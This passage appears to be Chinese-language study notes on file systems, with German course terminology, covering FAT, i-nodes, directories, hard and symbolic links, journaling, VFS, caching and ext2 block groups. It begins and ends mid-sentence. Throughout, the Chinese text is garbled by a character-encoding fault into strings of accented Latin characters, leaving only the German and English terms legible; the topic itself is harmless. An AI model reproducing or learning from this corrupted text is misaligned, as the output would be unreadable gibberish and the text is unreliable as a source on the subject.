ï¼‰ä¼šäº§ç”Ÿå¾ˆå¤šå°å—ï¼Œå¯¼è‡´å¾ˆéš¾æ‰¾åˆ°ä¸€å¤§å—è¿ç»­ç©ºé—´ç»™æ–°æ–‡ä»¶ã€‚ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ ï¼ˆinterne Fragmentierung æŒ‡çš„æ˜¯æƒ³Buddy Algorithmé‚£æ ·ç®—æ³•æœ¬èº«å¯¼è‡´çš„ç¢ç‰‡åŒ–ã€‚ï¼‰ æ‰€ä»¥æ¯”è¾ƒé€‚åˆåªè¯»ä»‹è´¨ï¼ˆRead-Only-Medienï¼‰ï¼Œæ¯”å¦‚è¯´CD-ROMï¼ŒDVDï¼ŒBluRay-Disks é“¾å¼åˆ†é…ï¼ˆLinked List Allocationï¼‰ä½¿ç”¨ä¸€ä¸ªé“¾è¡¨ç®¡ç†æ‰€ä»¥æ–‡ä»¶ä½¿ç”¨çš„å—ï¼Œæ¯ä¸ªå—çš„å¼€å¤´åŒ…å«æŒ‡å‘ä¸‹ä¸€ä¸ªå—çš„æŒ‡é’ˆã€‚ ä¼˜ç‚¹ï¼š ä¸ä¼šæµªè´¹ç©ºé—´ ä¸åƒè¿ç»­åˆ†é…é‚£æ ·éœ€è¦ä¸€æ•´æ®µè¿ç»­ç©ºé—²åŒºåŸŸï¼Œæ‰€æœ‰é›¶æ•£çš„ç©ºé—²å—éƒ½å¯ä»¥åˆ©ç”¨ ç¼ºç‚¹ï¼š éšæœºè®¿é—®æ€§èƒ½å·®ï¼ˆNiedrige Performance bei Random-Accessï¼‰ å› ä¸ºå¦‚æœè¦è®¿é—®ç¬¬ n å—ï¼Œå¿…é¡»å…ˆè¯»å–å®Œå‰ n-1 å—ã€‚ æ¯ä¸ªå—è¦å ç”¨ä¸€ç‚¹ç©ºé—´å­˜æŒ‡é’ˆ å¯¼è‡´å¯ç”¨ç©ºé—´ä¸æ˜¯æ ‡å‡†çš„ 2 çš„å¹‚ï¼ˆkeine 2er-Potenzï¼‰ã€‚ ä¸æ“ä½œç³»ç»Ÿå—å¤§å°å…¼å®¹æ€§å·® å› ä¸ºè®¸å¤šç³»ç»Ÿè¦æ±‚å—å¤§å°æ˜¯å›ºå®šçš„ï¼ˆä¾‹å¦‚ 512Bã€1024Bã€2048B ç­‰ï¼‰ï¼ŒæŒ‡é’ˆå äº†ç©ºé—´åå¯èƒ½å¯¼è‡´ä¸ä¾¿äºæŒ‰å—è¯»å–ã€‚ é’ˆå¯¹æåˆ°çš„è¿™äº›é—®é¢˜æˆ‘ä»¬å¯ä»¥åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œä¸€ç‚¹æ”¹è‰¯ï¼š FAT æ–‡ä»¶åˆ†é…è¡¨ï¼ˆLinked List Allocation mit File Allocation Tableï¼‰æˆ‘ä»¬ç°åœ¨å°†æ‰€æœ‰æŒ‡é’ˆé›†ä¸­å­˜å‚¨åœ¨ä¸€å¼ è¡¨ä¸­ï¼ˆFATï¼‰ï¼Œæ”¾åœ¨ä¸»å­˜ï¼ˆHauptspeicherï¼‰ä¸­ç®¡ç†ã€‚ ä¾‹å­ï¼š æˆ‘ä»¬ç°åœ¨æœ‰2ä»½æ–‡ä»¶ï¼š Aï¼š4, 7, 2, 10, 12 (-1 = Ende der Liste) B: 6, 3, 11, 14 (-1) ä¼˜ç‚¹ï¼š æ¯ä¸ªå—ä¸ä¼šæµªè´¹å­˜å‚¨ç©ºé—´ï¼ˆkein Verschnittï¼‰ éšæœºè®¿é—®ï¼ˆRandom-Accessï¼‰æ›´å¿« åªéœ€è¦åœ¨å†…å­˜ä¸­æ“ä½œè¡¨å³å¯ ç¼ºç‚¹ï¼š FAT è¡¨å¿…é¡»å¸¸é©»å†…å­˜ï¼ˆRAMï¼‰ï¼Œä¼šæ¶ˆè€—å¤§é‡å†…å­˜ã€‚ï¼ˆç£ç›˜ç©ºé—´è¶Šå¤§FATä¹Ÿè¶Šå¤§ï¼‰ i-nodesï¼ˆç´¢å¼•èŠ‚ç‚¹ï¼‰æ¯ä¸ªæ–‡ä»¶éƒ½ç”±ä¸€ä¸ªi-nodeæ•°æ®ç»“æ„æ¥è¡¨ç¤ºï¼Œi-nodeä¸­ä¼šåŒ…å«æ–‡ä»¶çš„å…ƒæ•°æ®ï¼ˆDateiattributeï¼‰ä»¥åŠç£ç›˜å—çš„åœ°å€ï¼ˆ Adressenï¼‰ã€‚ ä¼˜ç‚¹ï¼š å†…å­˜å ç”¨ä½ å› ä¸ºåªéœ€å°†æ‰“å¼€çš„æ–‡ä»¶çš„i-nodeåŠ è½½åˆ°å†…å­˜ä¸­ã€‚ å¯æ‰©å±•æ€§å¼º æ‰€éœ€å†…å­˜ç©ºé—´åªä¸â€œåŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æ•°â€æœ‰å…³ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç£ç›˜å®¹é‡ã€‚ ç¼ºç‚¹ï¼š i-node èƒ½å­˜çš„åœ°å€æ•°é‡æ˜¯å›ºå®šçš„ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨å¤šçº§é—´æ¥åœ°å€ï¼š æ¯”å¦‚è¯´ä¸€çº§é—´æ¥ã€äºŒçº§é—´æ¥ã€ä¸‰çº§é—´æ¥ï¼ˆIndirekte, doppelt indirekte und dreifach indirekte BlÃ¶ckeï¼‰ï¼Œå³æœ€åçš„åœ°å€ä¸æ˜¯æ•°æ®å—ï¼Œè€Œæ˜¯æŒ‡å‘ä¸€ä¸ªåŒ…å«æ›´å¤šåœ°å€çš„â€œå—åœ°å€è¡¨â€ï¼ˆå³æŒ‡é’ˆå—ï¼‰ã€‚ åœ¨ ext2/3/4 ä¸­ï¼Œæ¯ä¸ª inode éƒ½åŒ…å« 12 ä¸ªç›´æ¥æŒ‡å‘æ–‡ä»¶æ•°æ®å—çš„ direct block æŒ‡é’ˆã€‚ ç›®å½•ï¼ˆVerzeichnissenï¼‰æ“ä½œç³»ç»Ÿéœ€è¦é€šè¿‡è§£æè·¯å¾„åæ¥æ‰¾åˆ°ç¡¬ç›˜ä¸Šçš„å®é™…æ–‡ä»¶ä½ç½®ã€‚ ä¸€ä¸ªç›®å½•å…¶å®å°±æ˜¯ä¸€ç»„ç›®å½•é¡¹ï¼ˆVerzeichniseintragï¼Œdirectory entryï¼‰çš„é›†åˆã€‚å½“æ“ä½œç³»ç»Ÿé€šè¿‡ä¸€ä¸ªè·¯å¾„æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œä¼šæŒ¨ä¸ªæŸ¥æ‰¾å¯¹åº”çš„ç›®å½•é¡¹ã€‚ ä¸€ä¸ªç›®å½•é¡¹ä¼šåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š æ–‡ä»¶å å®šä½ä¿¡æ¯ï¼ˆAdress-Informationen, um die gesuchte Datei zu lokalisierenï¼‰ æ–‡ä»¶å±æ€§ï¼ˆDatei-Attributeï¼‰ ï¼ˆæ³¨æ„ï¼Œç›®å½•é¡¹å’Œæ–‡ä»¶æ˜¯2ä¸ªä¸åŒçš„ä¸œè¥¿ã€‚ç›®å½•é¡¹å®é™…ä¸Šåªæ˜¯ä¸€æ¡çºªå½•ï¼Œç”¨äºæŒ‡å‘ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å­ç›®å½•ï¼Œå¹¶ä¸ä¼šå­˜å‚¨æ–‡ä»¶å†…å®¹ï¼ˆç”¨äºå¯¼èˆªï¼‰ã€‚è€Œæ–‡ä»¶æ˜¯å®é™…å­˜å‚¨æ•°æ®çš„å¯¹è±¡ï¼‰ æ–‡ä»¶å±æ€§çš„å­˜å‚¨æœ‰2ç§å¸¸è§çš„æ–¹å¼ï¼š 1. ç›´æ¥å­˜å‚¨åœ¨ç›®å½•é¡¹ä¸­ï¼š æ¯ä¸ªç›®å½•é¡¹ä¸ä»…åŒ…å«æ–‡ä»¶åï¼Œè¿˜ç›´æ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶çš„å±æ€§ä¿¡æ¯ã€‚ 2. å­˜å‚¨åœ¨ i-nodes ä¸­ï¼š æ¯ä¸ªç›®å½•é¡¹åªåŒ…å«æ–‡ä»¶åä»¥åŠä¸€ä¸ªæŒ‡å‘ i-node çš„å¼•ç”¨ï¼ˆç¼–å·æˆ–æŒ‡é’ˆï¼‰ï¼Œæ–‡ä»¶çš„æ‰€æœ‰å±æ€§éƒ½é›†ä¸­ä¿å­˜åœ¨ i-node ä¸­ã€‚ æ–‡ä»¶åçš„å­˜å‚¨å› ä¸ºæˆ‘ä»¬å¸Œæœ›å¯ä»¥ä½¿ç”¨ä»»æ„é•¿åº¦çš„æ–‡ä»¶åï¼Œæ‰€ä»¥éœ€è¦è€ƒè™‘è¿™äº›ä¸åŒé•¿åº¦çš„æ–‡ä»¶åè¯¥æ€ä¹ˆå­˜å‚¨ã€‚ é¦–å…ˆæƒ³åˆ°çš„ä¾¿æ˜¯ 1. å›ºå®šæ–‡ä»¶åé•¿åº¦ï¼Œæ¯”å¦‚è¯´é™åˆ¶æ¯ä»½æ–‡ä»¶çš„æ–‡ä»¶ååœ¨255ä¸ªå­—ç¬¦ä»¥å†…ã€‚ä½†æ˜¯è¿™æ ·ä¸€æ¥è‚¯å®šéœ€è¦ç»™æ¯ä»½æ–‡ä»¶çš„æ–‡ä»¶å255ä¸ªå­—ç¬¦çš„ä½ç½®ï¼Œç”±äºä¸æ˜¯æ¯ä»½æ–‡ä»¶çš„åå­—éƒ½æœ‰è¿™ä¹ˆé•¿ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´å†…å­˜æˆ–è€…ç£ç›˜ç©ºé—´çš„æµªè´¹ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªé—®é¢˜å°†è¿™ä¸ªæ–¹æ³•æ”¹è‰¯ä¸€ç‚¹ï¼š 2. å…è®¸æ–‡ä»¶ä½¿ç”¨ä»»æ„é•¿åº¦çš„æ–‡ä»¶åï¼Œç„¶åä¸“é—¨ç”¨ä¸€å—ç©ºé—´è®°å½•å½“å‰æ–‡ä»¶åçš„é•¿åº¦ã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰ ä½†æ˜¯è¿™ç§æ–¹æ³•åŒæ ·ä¹Ÿæœ‰ä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ï¼šå› ä¸ºæ–‡ä»¶åé•¿åº¦çš„ä¸åŒæ„ï¼Œåˆ›å»ºå’Œåˆ é™¤æ–‡ä»¶å®¹æ˜“å¯¼è‡´å­˜å‚¨ç©ºé—´ç¢ç‰‡åŒ–ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†æ‰€æœ‰çš„æ–‡ä»¶åé›†ä¸­å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯: 3. åªå­˜å‚¨æ–‡ä»¶å±æ€§ä»¥åŠä¸€ä¸ªæŒ‡å‘å †ï¼ˆHeapï¼‰é‡Œå­˜å‚¨æ–‡ä»¶åä½ç½®çš„æŒ‡é’ˆã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰ å°½ç®¡å·²ç»æ”¹å–„å¾ˆå¤šäº†ï¼Œä½†è¿™ä¸ªæ–¹æ¡ˆä¾æ—§ä¸å¤Ÿå®Œç¾ï¼šåœ¨åŒ…å«å¤§é‡æ¡ç›®çš„ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ä¼šå¾ˆæ…¢ï¼ˆSuchen von Dateien in Verzeichnissen mit vielen EintrÃ¤gen ist langsamï¼‰ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ 4. åœ¨3çš„åŸºç¡€ä¸Šå¼•å…¥å“ˆå¸Œè¡¨æ¥æé«˜ç´¢å¼•æ•ˆç‡ï¼š åœ¨æ¯ä¸ªç›®å½•ä¸­ä½¿ç”¨ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œé€šè¿‡å¯¹æ–‡ä»¶åè¿›è¡Œå“ˆå¸Œè®¡ç®—æ¥å¾—åˆ°ç›®å½•é¡¹çš„ç´¢å¼•ã€‚ç›®å½•é¡¹ä¸­çš„å“ˆå¸Œå†²çªï¼ˆKollisionenï¼‰åˆ™é€šè¿‡é“¾è¡¨æ¥å¤„ç†ã€‚ é“¾æ¥ï¼ˆLinksï¼‰ä¸ºäº†è®©ï¼ˆä¸åŒï¼‰ç”¨æˆ·åœ¨ä¸åŒè·¯å¾„ä¸‹å¯ä»¥æ‰“å¼€åŒä¸€ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥é“¾æ¥è¿™ä¸ªæœºåˆ¶ã€‚ é“¾æ¥åˆ†ä¸º2ç§ï¼š ç¡¬é“¾æ¥ï¼ˆHard Linksï¼‰ ç›®å½•é¡¹ä¸æ˜¯ç›´æ¥æŒ‡å‘æ–‡ä»¶æ•°æ®ï¼Œè€Œæ˜¯æŒ‡å‘i-nodeï¼Œå…è®¸å¤šä¸ªç›®å½•é¡¹æŒ‡å‘åŒä¸€ä¸ª i-nodeã€‚æ³¨æ„ï¼Œåœ¨ç¡¬é“¾æ¥é‡Œæ²¡æœ‰â€œä¸»é“¾æ¥â€æˆ–â€œæ¬¡é“¾æ¥â€çš„åŒºåˆ«ï¼Œæ‰€æœ‰ç¡¬é“¾æ¥æ˜¯å¹³ç­‰çš„ã€‚æ¯ä¸ª i-node ä¼šè®°å½•å¼•ç”¨è®¡æ•°ï¼ˆref countï¼‰ï¼Œå½“å¼•ç”¨è®¡æ•°å½’é›¶æ—¶ï¼Œè¯´æ˜æ²¡æœ‰ç›®å½•å†æŒ‡å‘å®ƒï¼Œå°±å¯ä»¥åˆ é™¤è¿™ä¸ªæ–‡ä»¶äº†ã€‚ ï¼ˆè¿™ä¹Ÿè§£é‡Šäº† UNIX åˆ é™¤å‘½ä»¤å« unlink()ï¼Œå› ä¸ºå®ƒå®é™…ä¸Šæ˜¯å–æ¶ˆä¸€ä¸ªç›®å½•é¡¹åˆ° i-node çš„é“¾æ¥ï¼Œè€Œä¸æ˜¯é©¬ä¸Šåˆ é™¤æ–‡ä»¶ã€‚ï¼‰ è½¯é“¾æ¥/ç¬¦å·é“¾æ¥ï¼ˆSymbolic Linksï¼‰åˆ›å»ºä¸€ä¸ªç‰¹æ®Šç±»å‹çš„æ–‡ä»¶ï¼Œé‡Œé¢ä¿å­˜çš„æ˜¯ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„åã€‚ è½¯é“¾æ¥ç±»ä¼¼äºWindowsé‡Œçš„å¿«æ·æ–¹å¼ï¼Œä½†å¹¶ä¸å®Œå…¨ä¸€æ ·ã€‚è½¯è¿æ¥æ˜¯æ–‡ä»¶ç³»ç»Ÿçº§åˆ«æ”¯æŒï¼Œè€Œå¿«æ·æ–¹å¼åˆ™æ˜¯åº”ç”¨å±‚æ”¯æŒã€‚è¿™æ„å‘³ç€ç³»ç»Ÿå±‚é¢ä¼šè‡ªåŠ¨è§£æè½¯é“¾æ¥ï¼Œä½†æ˜¯Windowsé‡Œçš„å¿«æ·æ–¹å¼éœ€è¦Shellæˆ–èµ„æºç®¡ç†å™¨è§£æã€‚ æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿï¼ˆJournaling-Dateisystemeï¼‰ä¸»è¦æ˜¯ä¸ºäº†ä¿è¯ç³»ç»Ÿå´©æºƒåçš„æ•°æ®ä¸€è‡´æ€§ï¼Œç±»ä¼¼äºDatenbanké‡Œçš„Transaktionsverwaltungã€‚ åœ¨ UNIX ä¸‹åˆ é™¤ä¸€ä¸ªæ–‡ä»¶éœ€è¦3ä¸ªæ­¥éª¤ï¼š ä»ç›®å½•ä¸­ç§»é™¤æ–‡ä»¶çš„ç›®å½•é¡¹ï¼ˆEntferne die Datei aus ihrem Verzeichnisï¼‰ å°†æ–‡ä»¶å¯¹åº”çš„ i-node é‡Šæ”¾ï¼ˆGib den i-node in den Pool der freien i-nodes freiï¼‰ å°†æ–‡ä»¶å ç”¨çš„ç£ç›˜æ•°æ®å—æ ‡è®°ä¸ºâ€œå¯ç”¨â€ï¼ˆMarkiere alle von der Datei belegten Festplatten BlÃ¶cke als freiï¼‰ ä½†å¦‚æœåœ¨æŸä¸€æ­¥ç»“æŸåç³»ç»Ÿå‘ç”Ÿäº†å´©æºƒï¼Œå°±ä¼šå¯¼è‡´å¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œæ¯”å¦‚è¯´æ•°æ®ä¸¢å¤±æˆ–è€…æ˜¯ç©ºé—´æ³„éœ²ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿï¼ˆJournaling-Dateisystemeï¼‰æ¥é¢„é˜²è¿™äº›é—®é¢˜ï¼šä¼šå…ˆå°†æ‰€æœ‰å¯¹æ–‡ä»¶ç³»ç»Ÿçš„æ›´æ”¹æ“ä½œè®°å½•åœ¨æ—¥å¿—åŒºåŸŸï¼ˆJournalï¼‰ä¸­ï¼Œç„¶åæ‰å®é™…æ‰§è¡Œã€‚è¿™æ ·ä¸€æ¥æ‰€æœ‰æ“ä½œéƒ½å¯ä»¥ä»æ—¥å¿—ä¸­æ¢å¤æˆ–é‡åšï¼Œç¡®ä¿ä¸€è‡´æ€§ã€‚ å…·ä½“æ“ä½œæµç¨‹ï¼š é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ—¥å¿—æ¡ç›®ï¼Œæè¿°å³å°†æ‰§è¡Œçš„ä¸‰é¡¹æ“ä½œã€‚ï¼ˆErstellen eines Log-Eintrags, der die drei Operationen beschreibtï¼‰ å°†è¯¥æ—¥å¿—å†™å…¥ç£ç›˜çš„æ—¥å¿—åŒºã€‚ï¼ˆSpeicherung in Journal auf der Platteï¼‰ ç„¶åéœ€è¦é‡æ–°è¯»å–æ—¥å¿—å†…å®¹ä»¥ç¡®è®¤æ˜¯å¦æ­£ç¡®å†™å…¥ã€‚ æ‰§è¡Œå®é™…çš„3æ­¥æ“ä½œã€‚ï¼ˆAusfÃ¼hren der drei Operationenï¼‰ æ¯å®Œæˆä¸€æ­¥æ“ä½œï¼Œéƒ½åœ¨ç£ç›˜ä¸Šè®°å½•ä¸€æ¬¡â€œè¿›åº¦â€ï¼Œè¡¨ç¤ºè¯¥æ“ä½œå·²å®Œæˆã€‚ï¼ˆAbschluss jeder Operation auf der Platte vermerkt: Fortschrittsberichtï¼‰ ä¸‰ä¸ªæ“ä½œéƒ½æˆåŠŸå®Œæˆåï¼Œåˆ é™¤æ—¥å¿—æ¡ç›®ã€‚ ç„¶ååœ¨ç³»ç»Ÿé‡å¯æˆ–è€…å‘ç”Ÿå´©æºƒåä¼šè¿›è¡Œä»¥ä¸‹æ“ä½œï¼š é¦–å…ˆæ£€æŸ¥æ—¥å¿—å†…å®¹ã€‚ï¼ˆInspektion des Journalsï¼‰ å¦‚æœå‘ç°æŸä¸ªæ“ä½œæ²¡æ‰§è¡Œå®Œï¼Œé‚£ä¹ˆä¼šé‡æ–°æ‰§è¡Œæ‰€æœ‰æ“ä½œã€‚ åªä¸è¿‡è¿™äº›éƒ½ä¸€ä¸ªå…±åŒçš„å‰æï¼šæ‰€æœ‰æ“ä½œå¿…é¡»æ˜¯å¹‚ç­‰çš„ï¼ˆidempotentï¼‰ï¼Œå³è¿›è¡Œ1æ¬¡æ“ä½œä¸è¿›è¡Œnæ¬¡ï¼ˆç›¸åŒçš„ï¼‰æ“ä½œå¾—åˆ°çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ ä¾‹å­ï¼š å°†ä¸€å—Blockæ ‡è®°æˆfreiï¼šæ˜¯idempotentçš„ã€‚ æŠŠç©ºé—²å—ç®€å•åœ°åŠ åˆ°â€œç©ºé—²å—åˆ—è¡¨æœ«å°¾â€ï¼šä¸æ˜¯idempotentçš„ï¼Œéœ€è¦æ”¹æˆ å…ˆæ£€æŸ¥ä¸€ä¸‹å—næ˜¯å¦å·²ç»åœ¨ç©ºé—²åˆ—è¡¨ä¸­ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå†åŠ å…¥ã€‚ è¿˜æœ‰ä¸€ä¸ªåŠæ³•ä¹Ÿå¯ä»¥æé«˜æ–‡ä»¶ç³»ç»Ÿçš„å¯é æ€§ï¼ˆErhÃ¶hung der ZuverlÃ¤ssigkeitï¼‰ï¼šæŠŠå¤šä¸ªæ“ä½œåŒ…è£…æˆä¸€ä¸ªåŸå­äº‹åŠ¡ï¼ˆatomaren Transaktionï¼Œå³ ganz oder gar nichtï¼‰ã€‚ è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVirtual File Systemï¼ŒVFSï¼‰ä¸ºäº†ç³»ç»Ÿçš„å…¼å®¹æ€§éœ€æ±‚ï¼ˆä¸åŒçš„æ“ä½œç³»ç»Ÿå’Œè®¾å¤‡å¯èƒ½ä½¿ç”¨ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼ï¼‰ä»¥åŠå¤šæ ·åŒ–çš„åº”ç”¨åœºæ™¯ï¼Œä¸€èˆ¬çš„æ“ä½œç³»ç»Ÿéƒ½ä¼šæ”¯æŒå¤šç§æ–‡ä»¶ç³»ç»Ÿã€‚ æ¯”å¦‚åœ¨ Windows ä¸‹ï¼Œå¯ä»¥åŒæ—¶æœ‰ NTFSã€FAT32ã€CD-ROM ç­‰æ–‡ä»¶ç³»ç»Ÿã€‚ Windowsä¼šå°†æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿä¼šè¢«åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„ç›˜ç¬¦ï¼ˆå¦‚ C:ã€D:ï¼‰ï¼Œè€Œç±» Unix ç³»ç»Ÿåˆ™æ˜¯å°†æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿæ•´åˆåˆ°ä¸€ä¸ªç»Ÿä¸€çš„å±‚çº§ç»“æ„ä¸­ï¼Œå¯¹ç”¨æˆ·å®Œå…¨é€æ˜ã€‚ Unixçš„è¿™ä¸ªæ•´åˆæ˜¯ä¾¿é€šè¿‡è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVirtual File Systemï¼ŒVFSï¼‰å®ç°çš„ã€‚ VFSè´Ÿè´£æä¾›ä¸€ä¸ªï¼ˆéµå¾ª POSIX æ ‡å‡†çš„ï¼‰ç»Ÿä¸€çš„æ¥å£ï¼ˆæ¯”å¦‚ openã€readã€writeã€lseekç­‰ï¼‰ï¼Œç”¨äºæ”¯æŒåœ¨ä¸€ä¸ªæœ¬åœ°ç³»ç»Ÿä¸­æ¥å…¥å¤šç§ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿã€‚ å›¾ç¤ºï¼š ä¼˜åŒ–ç­–ç•¥ï¼ˆOptimierungï¼‰Buffer Cacheï¼ˆç¼“å†²åŒºç¼“å­˜ï¼‰ï¼ˆè¿™éƒ¨åˆ†ERAçš„Cacheé‚£ä¸€ç« ä¼šè¯¦ç»†è®²ã€‚ï¼‰ æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨å†…å­˜ä¸­çš„ä¸€éƒ¨åˆ†ä½œä¸ºç¼“å­˜åŒºåŸŸï¼Œæ¥æš‚å­˜ç£ç›˜ä¸Šçš„æ•°æ®å—ã€‚ å¯¹äºè¯»çš„æ“ä½œçš„å¤„ç†æµç¨‹ï¼š å…ˆæ£€æŸ¥æ‰€éœ€çš„æ•°æ®å—æ˜¯å¦å·²ç»åœ¨ç¼“å­˜ä¸­ï¼Ÿå¦‚æœæ˜¯ï¼Œå°±è·³åˆ°æ­¥éª¤3 å¦‚æœä¸åœ¨ç¼“å­˜ä¸­ï¼šå°±ä»ç£ç›˜è¯»å–è¿™ä¸ªå—ï¼Œå¹¶åŠ è½½åˆ°ç¼“å­˜ä¸­ è¿”å›è¿™ä¸ªæ•°æ®å—çš„å†…å®¹ç»™è°ƒç”¨è€…ï¼ˆç”¨æˆ·è¿›ç¨‹ï¼‰ å½“ç¼“å­˜ç©ºé—´ä¸å¤Ÿæ—¶ä¹Ÿéœ€è¦æ›¿æ¢ç­–ç•¥ï¼ˆErsetzungsstrategieï¼‰ã€‚ è¿›è¡Œå†™çš„æ“ä½œæ—¶æ•°æ®ä¼šå…ˆå†™å…¥ç¼“å­˜åŒºï¼Œä¸ä¸€å®šç«‹åˆ»å†™å…¥ç£ç›˜ã€‚åœ¨Unixä¸­å¯ä»¥ä½¿ç”¨ sync å‘½ä»¤æ‰‹åŠ¨å°†ç¼“å­˜åŒºå†…å®¹å†™å…¥ç£ç›˜ï¼Œä¸è¿‡ç³»ç»Ÿè‡ªå·±ä¹Ÿä¼šä¼šå‘¨æœŸæ€§è‡ªåŠ¨æ‰§è¡Œï¼ˆä¾‹å¦‚æ¯30ç§’ç”± update å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰å®Œæˆï¼‰ã€‚Windowsé‡‡ç”¨çš„åˆ™æ˜¯ Write-thru Cacheï¼Œå³å†™æ“ä½œä¼šç«‹å³åŒæ­¥åˆ°ç£ç›˜ã€‚ é¢„è¯»ï¼ˆRead-Aheadï¼‰é¢„è¯»æŒ‡çš„æ˜¯æå‰æŠŠå³å°†éœ€è¦çš„æ•°æ®å—åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œä»¥æ­¤æ¥æé«˜è¯»å–æ€§èƒ½ã€‚ å¯ä»¥ ç®€å•é¢„æµ‹ï¼Œæˆ–è€… å³å‡è®¾ç”¨æˆ·ä¼šæŒ‰é¡ºåºè¿›è¡Œè¯»å–ï¼Œæ¯”å¦‚è¯´åœ¨ç”¨æˆ·è¯·æ±‚è¯»å–æŸä¸ªæ–‡ä»¶çš„ç¬¬ k å—æ—¶ï¼Œå°±å…ˆæ£€æŸ¥ç¬¬ k+1 å—æ˜¯å¦å·²åœ¨ç¼“å­˜ä¸­ã€‚å¦‚æœä¸åœ¨ç¼“å­˜ï¼Œå°±æå‰åŠ è½½ç¬¬ k+1 å—ã€‚ ç»“åˆç»“åˆæ–‡ä»¶çš„è®¿é—®å†å²è¿›è¡Œé¢„æµ‹ ç»™æ–‡ä»¶è®¾ç½®ä¸€ä¸ªå±æ€§ï¼Œè®°å½•å®ƒæ˜¯å¦æ˜¯è¢«é¡ºåºè¯»å–ã€‚å¦‚æœç¡®è®¤æ˜¯é¡ºåºè®¿é—®ï¼Œæ‰å¯ç”¨ Read-Aheadã€‚ å‡å°‘ç£ç›˜è¯»å†™å¤´çš„ç§»åŠ¨ å°½é‡è®©åŒä¸€æ–‡ä»¶çš„å—ç‰©ç†ä¸Šé å¾—æ›´è¿‘ æ¯”å¦‚å­˜å‚¨åœ¨åŒä¸€ä¸ªç£æŸ±ï¼ˆZylinderï¼‰ä¸Šçš„BlÃ¶ckené‡Œã€‚ å—ç»„åˆ†é…ï¼ˆVerwaltung von BlÃ¶cken in Gruppenï¼‰ ä¸æŒ‰å•ä¸ªå—åˆ†é…ï¼Œè€Œæ˜¯æ¯æ¬¡åˆ†é…2ä¸ªæˆ–4ä¸ªå—ã€‚è¿™æ ·å¯ä»¥éšå¼åœ°æé«˜å±€éƒ¨æ€§ï¼ˆLokalitÃ¤tï¼‰ã€‚ i-node ç»“æ„ä¸è¦éƒ½é›†ä¸­åœ¨åˆ†åŒºå¼€å¤´ï¼ˆi-nodes nicht (nur) am Anfang der Partitionï¼‰ ç¢ç‰‡æ•´ç†ï¼ˆDefragmentierungï¼‰å°†æ–‡ä»¶çš„æ‰€æœ‰å—é‡æ–°æ’åˆ—ï¼Œä½¿å®ƒä»¬å°½å¯èƒ½è¿ç»­ï¼Œæé«˜è®¿é—®æ•ˆç‡ã€‚ï¼ˆNeugruppierung der BlÃ¶cke der Dateien auf der Festplatteï¼‰ ä¾‹å­Linuxçš„ext2ext2ä¼šå°†ç¡¬ç›˜åˆ†åŒºåˆ’åˆ†ä¸ºâ€œå—ç»„â€ç»“æ„ï¼ˆAufteilung der Festplatten-Partition in Block-Gruppenï¼‰ã€‚ Block 0 æ˜¯é¢„ç•™ç»™ç³»ç»Ÿå¯åŠ¨ç”¨çš„ï¼ˆSystem-Bootup-Vorgangï¼‰ã€‚ è€Œå…¶ä½™çš„æ‰€æœ‰Block-Gruppenéƒ½åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š è¶…çº§å—ï¼ˆSuperblockï¼‰ï¼š åŒ…å«æœ‰å…³æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ i-nodeå’Œæ•°æ®å—çš„æ€»æ•°ã€ç©ºé—²å—åˆ—è¡¨çš„æŒ‡é’ˆç­‰ã€‚ ï¼ˆAnzahl der i-nodes und BlÃ¶cke, Pointer zur Liste mit freien BlÃ¶cken, etc.ï¼‰ ç»„æè¿°ç¬¦è¡¨ï¼ˆGruppen-Deskriptor-Tabelleï¼‰ï¼š åŒ…å«è¿™ä¸ªå—ç»„çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´Bitmapçš„ä½ç½®ã€ç©ºé—²çš„ i-node å’Œæ•°æ®å—çš„æ•°é‡ã€ç›®å½•çš„æ•°é‡ç­‰ã€‚ ï¼ˆPosition der Bitmaps, Anzahl freie i-nodes und BlÃ¶cke, Anzahl der Verzeichnisseï¼‰ ä¸¤ä¸ªä½å›¾ï¼ˆBitmapsï¼‰ï¼š 